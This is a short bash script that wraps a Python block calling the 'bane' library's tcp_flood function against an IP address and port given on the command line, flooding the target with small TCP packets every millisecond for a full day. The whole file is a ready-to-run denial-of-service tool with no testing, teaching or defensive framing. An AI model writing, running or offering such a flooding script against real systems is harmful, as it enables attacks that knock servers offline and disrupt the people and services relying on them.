#!/usr/bin/env bash

ip=$1
port=$2

python3.9 <<END
import bane
import time

print("$ip")
print($port)

bane.tcp_flood("$ip", p=$port , min_size=10, max_size=20 , duration= 86400 , interval=0.001)
time.sleep(86400)
END